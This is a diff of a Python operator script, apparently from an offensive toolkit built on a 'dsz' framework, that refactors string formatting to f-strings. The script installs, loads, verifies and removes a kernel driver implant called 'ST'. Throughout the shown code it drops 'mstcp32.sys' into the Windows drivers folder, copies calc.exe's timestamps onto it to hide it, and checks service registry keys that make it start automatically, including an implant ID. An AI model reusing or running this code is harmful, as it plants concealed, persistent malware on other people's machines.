@@ -21,10 +21,10 @@ def regadd(regaddcommand):
         return 0
     regaddres = regaddcommand.execute()
     if regaddcommand.success:
-        dsz.ui.Echo(('Successfully added %s key.' % value), dsz.GOOD)
+        dsz.ui.Echo(f'Successfully added {value} key.', dsz.GOOD)
         return 1
     else:
-        dsz.ui.Echo(('Failed to add %s key!' % value), dsz.ERROR)
+        dsz.ui.Echo(f'Failed to add {value} key!', dsz.ERROR)
         return 0
 
 def install(passed_menu=None):
@@ -34,13 +34,16 @@ def install(passed_menu=None):
         return 0
     drivername = optdict['Configuration']['Driver Name']
     implantID = optdict['Configuration']['Implant ID']
-    dsz.ui.Echo(('==Installing %s==' % drivername), dsz.WARNING)
+    dsz.ui.Echo(f'==Installing {drivername}==', dsz.WARNING)
     localdriverpath = os.path.join(ops.RESDIR, 'ST1.14', 'mstcp32.sys')
     if verifydriver(passed_menu):
         if (not dsz.ui.Prompt('Do you wish to continue?', False)):
             return 0
     else:
-        putcmd = ops.cmd.getDszCommand(('put %s -name %s -permanent' % (localdriverpath, os.path.join(dsz.path.windows.GetSystemPath(), 'drivers', ('%s.sys' % drivername)))))
+        putcmd = ops.cmd.getDszCommand(
+            f"put {localdriverpath} -name {os.path.join(dsz.path.windows.GetSystemPath(), 'drivers', f'{drivername}.sys')} -permanent"
+        )
+
         (safe, reason) = putcmd.safetyCheck()
         if (not safe):
             dsz.ui.Echo(('Cannot execute the put command because of a failed safety check: \n%s' % reason), dsz.ERROR)
@@ -48,12 +51,19 @@ def install(passed_menu=None):
                 return 0
         putres = putcmd.execute()
         if putcmd.success:
-            dsz.ui.Echo(('Successfully put ST up as %s.' % drivername), dsz.GOOD)
+            dsz.ui.Echo(f'Successfully put ST up as {drivername}.', dsz.GOOD)
         else:
-            dsz.ui.Echo(('Put of ST as %s failed!' % drivername), dsz.ERROR)
+            dsz.ui.Echo(f'Put of ST as {drivername} failed!', dsz.ERROR)
             if (not dsz.ui.Prompt('Do you wish to continue?', False)):
                 return 0
-    matchfiletimescmd = ops.cmd.getDszCommand('matchfiletimes', src=os.path.join(dsz.path.windows.GetSystemPath(), 'calc.exe'), dst=os.path.join(dsz.path.windows.GetSystemPath(), 'drivers', ('%s.sys' % drivername)))
+    matchfiletimescmd = ops.cmd.getDszCommand(
+        'matchfiletimes',
+        src=os.path.join(dsz.path.windows.GetSystemPath(), 'calc.exe'),
+        dst=os.path.join(
+            dsz.path.windows.GetSystemPath(), 'drivers', f'{drivername}.sys'
+        ),
+    )
+
     (safe, reason) = matchfiletimescmd.safetyCheck()
     if (not safe):
         dsz.ui.Echo(('Cannot execute the matchfiletimes command because of a failed safety check: \n%s' % reason), dsz.ERROR)
@@ -100,7 +110,7 @@ def install(passed_menu=None):
 def uninstall(passed_menu=None):
     optdict = passed_menu.all_states()
     drivername = optdict['Configuration']['Driver Name']
-    dsz.ui.Echo(('==Uninstalling %s==' % drivername), dsz.WARNING)
+    dsz.ui.Echo(f'==Uninstalling {drivername}==', dsz.WARNING)
     if (not verifyinstalled(passed_menu)):
         dsz.ui.Echo("ST doesn't seem to be properly installed!", dsz.ERROR)
         if (not dsz.ui.Prompt('Do you wish to continue?', False)):
@@ -113,7 +123,13 @@ def uninstall(passed_menu=None):
                 return 0
         else:
             dsz.ui.Echo('Successfully unload ST', dsz.GOOD)
-    deletecmd = ops.cmd.getDszCommand('delete', file=os.path.join(dsz.path.windows.GetSystemPath(), 'drivers', ('%s.sys' % drivername)))
+    deletecmd = ops.cmd.getDszCommand(
+        'delete',
+        file=os.path.join(
+            dsz.path.windows.GetSystemPath(), 'drivers', f'{drivername}.sys'
+        ),
+    )
+
     (safe, reason) = deletecmd.safetyCheck()
     if (not safe):
         dsz.ui.Echo(('Cannot execute the delete command because of a failed safety check: \n%s' % reason), dsz.ERROR)
@@ -121,11 +137,11 @@ def uninstall(passed_menu=None):
             return 0
     deleteres = deletecmd.execute()
     if (not deletecmd.success):
-        dsz.ui.Echo(('Could not delete ST driver (%s)!.' % drivername), dsz.ERROR)
+        dsz.ui.Echo(f'Could not delete ST driver ({drivername})!.', dsz.ERROR)
         if (not dsz.ui.Prompt('Do you wish to continue?', False)):
             return 0
     else:
-        dsz.ui.Echo(('Delete of ST driver (%s) successful.' % drivername), dsz.GOOD)
+        dsz.ui.Echo(f'Delete of ST driver ({drivername}) successful.', dsz.GOOD)
     regdelcmd = ops.cmd.getDszCommand('registrydelete', hive='l', key=('system\\CurrentControlSet\\Services\\%s' % drivername), recursive=True)
     (safe, reason) = regdelcmd.safetyCheck()
     if (not safe):
@@ -149,7 +165,7 @@ def uninstall(passed_menu=None):
 def load(passed_menu=None):
     optdict = passed_menu.all_states()
     drivername = optdict['Configuration']['Driver Name']
-    dsz.ui.Echo(('==Loading %s==' % drivername), dsz.WARNING)
+    dsz.ui.Echo(f'==Loading {drivername}==', dsz.WARNING)
     drivercmd = ops.cmd.getDszCommand('drivers', load=drivername)
     (safe, reason) = drivercmd.safetyCheck()
     if (not safe):
@@ -157,17 +173,17 @@ def load(passed_menu=None):
         return 0
     driverres = drivercmd.execute()
     if (not drivercmd.success):
-        dsz.ui.Echo(('Driver %s was NOT successfully loaded!' % drivername), dsz.ERROR)
+        dsz.ui.Echo(f'Driver {drivername} was NOT successfully loaded!', dsz.ERROR)
         return 0
     else:
-        dsz.ui.Echo(('Driver %s was successfully loaded!' % drivername), dsz.GOOD)
+        dsz.ui.Echo(f'Driver {drivername} was successfully loaded!', dsz.GOOD)
         return 1
     verifyrunning(passed_menu)
 
 def unload(passed_menu=None):
     optdict = passed_menu.all_states()
     drivername = optdict['Configuration']['Driver Name']
-    dsz.ui.Echo(('==Unloading %s==' % drivername), dsz.WARNING)
+    dsz.ui.Echo(f'==Unloading {drivername}==', dsz.WARNING)
     drivercmd = ops.cmd.getDszCommand('drivers', unload=drivername)
     (safe, reason) = drivercmd.safetyCheck()
     if (not safe):
@@ -175,18 +191,27 @@ def unload(passed_menu=None):
         return 0
     driverres = drivercmd.execute()
     if (not drivercmd.success):
-        dsz.ui.Echo(('Driver %s was NOT successfully unloaded!' % drivername), dsz.ERROR)
+        dsz.ui.Echo(f'Driver {drivername} was NOT successfully unloaded!', dsz.ERROR)
         return 0
     else:
-        dsz.ui.Echo(('Driver %s was successfully unloaded!' % drivername), dsz.GOOD)
+        dsz.ui.Echo(f'Driver {drivername} was successfully unloaded!', dsz.GOOD)
         return 1
     verifyrunning(passed_menu)
 
 def verifydriver(passed_menu=None):
     optdict = passed_menu.all_states()
     drivername = optdict['Configuration']['Driver Name']
-    dsz.ui.Echo(('==Checking to see driver %s exists on disk==' % drivername), dsz.WARNING)
-    permissionscmd = ops.cmd.getDszCommand('permissions', file=os.path.join(dsz.path.windows.GetSystemPath(), 'drivers', ('%s.sys' % drivername)))
+    dsz.ui.Echo(
+        f'==Checking to see driver {drivername} exists on disk==', dsz.WARNING
+    )
+
+    permissionscmd = ops.cmd.getDszCommand(
+        'permissions',
+        file=os.path.join(
+            dsz.path.windows.GetSystemPath(), 'drivers', f'{drivername}.sys'
+        ),
+    )
+
     (safe, reason) = permissionscmd.safetyCheck()
     if (not safe):
         dsz.ui.Echo(('Cannot execute the permissions command because of a failed safety check: \n%s' % reason), dsz.ERROR)
@@ -197,7 +222,7 @@ def verifydriver(passed_menu=None):
         dsz.ui.Echo(("ST driver (%s) doesn't exist!" % drivername), dsz.ERROR)
         return 0
     else:
-        dsz.ui.Echo(('ST driver (%s) exists.' % drivername), dsz.GOOD)
+        dsz.ui.Echo(f'ST driver ({drivername}) exists.', dsz.GOOD)
         return 1
 
 def verifyinstalled(passed_menu=None):
@@ -205,7 +230,11 @@ def verifyinstalled(passed_menu=None):
     drivername = optdict['Configuration']['Driver Name']
     verifydriver(passed_menu)
     returnvalue = 1
-    dsz.ui.Echo(('==Checking to see if all reg keys for %s exist==' % drivername), dsz.WARNING)
+    dsz.ui.Echo(
+        f'==Checking to see if all reg keys for {drivername} exist==',
+        dsz.WARNING,
+    )
+
     regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername))
     regres = regcmd.execute()
     if (regcmd.success == 0):
@@ -216,7 +245,7 @@ def verifyinstalled(passed_menu=None):
     if (regcmd.success == 0):
         dsz.ui.Echo("ErrorControl key doesn't exist", dsz.ERROR)
         returnvalue = 0
-    elif (not (regres.key[0].value[0].value == '0')):
+    elif regres.key[0].value[0].value != '0':
         dsz.ui.Echo('ErrorControl key not set correctly', dsz.ERROR)
         returnvalue = 0
     regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Start')
@@ -224,7 +253,7 @@ def verifyinstalled(passed_menu=None):
     if (regcmd.success == 0):
         dsz.ui.Echo("Start key doesn't exist", dsz.ERROR)
         returnvalue = 0
-    elif (not (regres.key[0].value[0].value == '2')):
+    elif regres.key[0].value[0].value != '2':
         dsz.ui.Echo('Start key not set correctly', dsz.ERROR)
         returnvalue = 0
     regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Type')
@@ -232,7 +261,7 @@ def verifyinstalled(passed_menu=None):
     if (regcmd.success == 0):
         dsz.ui.Echo("Type key doesn't exist", dsz.ERROR)
         returnvalue = 0
-    elif (not (regres.key[0].value[0].value == '1')):
+    elif regres.key[0].value[0].value != '1':
         dsz.ui.Echo('Type key not set correctly', dsz.ERROR)
         returnvalue = 0
     regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Options')
@@ -240,7 +269,10 @@ def verifyinstalled(passed_menu=None):
     if (regcmd.success == 0):
         dsz.ui.Echo("Options key doesn't exist", dsz.ERROR)
         returnvalue = 0
-    elif (not (regres.key[0].value[0].value == '0a000000400100000600000021000000040000000002000001000000210000000000000006040000cb340000000700000000000021000000000000000604000034cb000020050a00010000000006000001000000')):
+    elif (
+        regres.key[0].value[0].value
+        != '0a000000400100000600000021000000040000000002000001000000210000000000000006040000cb340000000700000000000021000000000000000604000034cb000020050a00010000000006000001000000'
+    ):
         dsz.ui.Echo('Options key not set correctly', dsz.ERROR)
         returnvalue = 0
     regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Params')
@@ -250,7 +282,7 @@ def verifyinstalled(passed_menu=None):
         returnvalue = 0
     else:
         installedImplantID = regres.key[0].value[0].value
-        dsz.ui.Echo(('ST implant ID (Params): %s' % installedImplantID), dsz.GOOD)
+        dsz.ui.Echo(f'ST implant ID (Params): {installedImplantID}', dsz.GOOD)
     if returnvalue:
         dsz.ui.Echo('All ST keys exist with expected values', dsz.GOOD)
     else:
@@ -260,7 +292,7 @@ def verifyinstalled(passed_menu=None):
 def verifyrunning(passed_menu=None):
     optdict = passed_menu.all_states()
     drivername = optdict['Configuration']['Driver Name']
-    dsz.ui.Echo(('==Checking to see if %s is running==' % drivername), dsz.WARNING)
+    dsz.ui.Echo(f'==Checking to see if {drivername} is running==', dsz.WARNING)
     if dsz.windows.driver.VerifyRunning(drivername):
         dsz.ui.Echo('ST driver running.', dsz.GOOD)
         return 1
@@ -288,7 +320,7 @@ def main():
     st_menu = ops.menu.Menu()
     implantid = getimplantID()
     drivername = 'mstcp32'
-    st_menu.set_heading(('ST %s installation menu' % stVersion))
+    st_menu.set_heading(f'ST {stVersion} installation menu')
     st_menu.add_str_option(option='Driver Name', section='Configuration', state=drivername)
     st_menu.add_hex_option(option='Implant ID', section='Configuration', state=implantid)
     st_menu.add_option(option='Install Driver', section='Installation', callback=install, passed_menu=st_menu)
